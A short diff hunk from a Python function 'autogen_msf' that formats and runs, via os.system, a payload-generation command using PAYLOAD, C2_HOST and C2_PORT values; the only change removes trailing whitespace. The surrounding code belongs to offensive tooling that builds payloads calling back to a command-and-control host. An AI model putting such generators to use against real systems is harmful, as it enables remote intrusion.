@@ -27,7 +27,7 @@ def autogen_msf(filename, retval = {}):
 			pl = PAYLOAD,
 			lp = C2_HOST,
 			lh = C2_PORT,
-			gen = generated_file	
+			gen = generated_file
 		)
 	print("[!] '{}'".format(command))
 	os.system(command)
